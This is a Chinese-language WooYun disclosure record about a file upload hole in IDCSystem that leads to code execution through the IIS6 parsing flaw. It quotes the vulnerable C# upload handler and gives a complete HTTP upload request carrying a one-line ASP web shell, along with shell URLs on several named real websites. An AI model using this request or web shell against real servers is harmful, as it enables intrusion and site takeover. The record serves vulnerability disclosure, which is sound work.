{"id": 29047, "wybug_id": "wooyun-2015-0121260", "wybug_title": "IDCSystem前台某处鸡肋getshell（iis6解析漏洞）", "wybug_corp": "cloudgoing.com", "wybug_author": "loopx9", "wybug_date": "2015-06-17 22:10", "wybug_open_date": "2015-09-17 12:14", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["解析文件漏洞", "文件上传安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-22：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-17：\t细节向公众公开  简要描述： 上传漏洞，配合iis6解析漏洞可getshell. 详细说明：  上传处理代码:IDCSystem.dll:\nprivate static string smethod_37(){\tstring uCS = XS.getUCS(\"uss\", 1);\tstring text = HttpContext.Current.Request.Headers[\"action\"]; // http头获取action\tstring text2 = HttpContext.Current.Server.MapPath(XS.getUploadConfig(\"get_temp_dir\", \"prefix\"));\tstring text3 = text;\tstring result;\tif (text3 != null)\t{\t\tif (!(text3 == \"ftheme\") && !(text3 == \"btheme\") && !(text3 == \"js_plugin\"))\t\t{\t\t\tif (text3 == \"attachment\")  //action为attachment时，进入上传流程\t\t\t{\t\t\t\tgoto IL_A9;\t\t\t}\t\t}\t\telse\t\t{\t\t\tif (!XS.isAdmin())\t\t\t{\t\t\t\tresult = \"-1|No administrative privileges\";\t\t\t\treturn result;\t\t\t}\t\t\tgoto IL_A9;\t\t}\t}\tCommon.responseMsg(\"It works!\");\tIL_A9:\tint num = (HttpContext.Current.Request.Params[\"chunk\"] != null) ? int.Parse(HttpContext.Current.Request.Params[\"chunk\"]) : 0;\t\t//text4 为name参数传进，可控。\tstring text4 = (HttpContext.Current.Request.Params[\"name\"] != null) ? HttpContext.Current.Request.Params[\"name\"].ToLower() : \"temp.jpg\";\t\tstring str = (text4.LastIndexOf(\".\") < 0) ? \"unknow\" : text4.Substring(text4.LastIndexOf(\".\") + 1).ToLower();\tstring text5 = \",\" + XS.getUploadConfig(text, \"exts\") + \",\";\tif (text5.IndexOf(\",\" + str + \",\") < 0)\t{\t\tresult = \"-1|\" + xUser.smethod_40(text2, string.Concat(new string[]\t\t{\t\t\t\"UserID:\",\t\t\tuCS,\t\t\t\"\\r\\nUserIP:\",\t\t\tHttpContext.Current.Request.UserHostAddress,\t\t\t\"\\r\\nMessage: Invalid file type:\",\t\t\ttext4\t\t}));\t}\telse\t{\t\tFileStream fileStream = new FileStream(text2 + text4, (num == 0) ? FileMode.OpenOrCreate : FileMode.Append); \t\t\t\t//上传文件保存路径为 text2 + text4，text4可控，于是路径可控\t\t\t\tbyte[] array = null;\t\tif (HttpContext.Current.Request.ContentType == \"application/octet-stream\" && HttpContext.Current.Request.ContentLength > 0)\t\t{\t\t\tarray = new byte[HttpContext.Current.Request.InputStream.Length];\t\t\tHttpContext.Current.Request.InputStream.Read(array, 0, array.Length);\t\t}\t\telse\t\t{\t\t\tif (HttpContext.Current.Request.ContentType.Contains(\"multipart/form-data\") && HttpContext.Current.Request.Files.Count > 0 && HttpContext.Current.Request.Files[0].ContentLength > 0)\t\t\t{\t\t\t\tarray = new byte[HttpContext.Current.Request.Files[0].InputStream.Length];\t\t\t\tHttpContext.Current.Request.Files[0].InputStream.Read(array, 0, array.Length);\t\t\t}\t\t}\t\tif (array != null)\t\t{\t\t\tfileStream.Write(array, 0, array.Length);\t\t}\t\tfileStream.Close();\t\tfileStream.Dispose();\t\tresult = \"0\";\t}\treturn result;}\n文件后缀有限制，但可利用iis6解析漏洞来getshell.   漏洞证明：  这年头仍旧使用iis6的站点少了很多:\ncp.korea-vps.comwww.90dns.netwww.10028.itwww.aituyun.comwww.ccwiz.comwww.tjwq.wangwww.zhengdavps.comwww.xeonidc.com\n以www.10028.it为例:(需要登录)\nPOST http://www.10028.it/upload.aspx?at=upload HTTP/1.1Host: www.10028.itProxy-Connection: keep-aliveContent-Length: 302Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: nullUser-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryctAyyCGABVVmjkwnAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8action: attachmentCookie: uname=testxxoo; uss=hCkshKbroAa/8ORwcPi//A==------WebKitFormBoundaryctAyyCGABVVmjkwnContent-Disposition: form-data; name=\"img\"; filename=\"1.jpg\"Content-Type: image/jpeg<%eval(request(\"aa\"))%>------WebKitFormBoundaryctAyyCGABVVmjkwnContent-Disposition: form-data; name=\"name\"1.asp;.jpg------WebKitFormBoundaryctAyyCGABVVmjkwn--\n上传后shell地址:http://www.10028.it/files/temp/1.asp;.jpg\n\nhttp://www.xeonidc.com/files/temp/1.asp;.jpg\n\n   修复方案：  随机文件名.   版权声明：转载请注明来源 loopx9@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-06-19 12:13 厂商回复： 非常感谢您的反馈，我们已经在对IIS6的这个漏洞进行相应的处理方案！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-17 22:26 |    \t\thh2014 \t\t\t( 普通白帽子  |\t\t\t        Rank:225 漏洞数:11        | 继续)\t\t \n  看了厂商前两个都给的1rank哦    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}